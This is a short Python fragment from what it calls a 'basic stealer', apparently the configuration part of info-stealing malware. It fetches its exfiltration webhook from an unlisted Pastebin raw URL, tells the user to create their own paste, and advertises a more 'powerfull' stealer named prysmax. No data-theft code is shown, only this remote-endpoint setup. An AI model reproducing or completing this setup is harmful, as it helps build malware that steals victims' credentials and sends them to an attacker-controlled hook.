import requests

hook = requests.get("https://pastebin.com/raw/LP1W2uST").text # create a pastebin unlisted and put here, FORMAT RAW IMPORTANT

# soon new features xd. This is basic stealer, prysmax it's +++ powerfull
